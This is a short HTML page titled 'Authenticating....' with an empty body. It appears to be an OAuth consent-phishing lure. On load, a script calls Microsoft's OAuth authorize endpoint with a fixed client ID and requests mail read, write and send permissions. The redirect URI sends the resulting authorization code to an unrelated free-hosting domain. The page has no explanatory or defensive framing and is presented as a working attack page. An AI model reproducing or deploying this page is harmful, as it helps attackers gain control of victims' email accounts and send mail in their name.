<html>
<head>
<title>Authenticating....</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript">
  $(document).ready(function() {
    $.ajax({method: "GET", url: "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=22a62244-e7e7-4400-a606-3b4c2f3fd4cf&redirect_uri=http%3A%2F%2Fcodestudio.hol.es%2Floggedin%2F&response_type=code&scope=openid+Mail.Read+Mail.ReadWrite+Mail.Send"
		}).done(function(data){
        }).fail(function(data){
		});
  });
</script>
</head>
<body>
</body>
</html>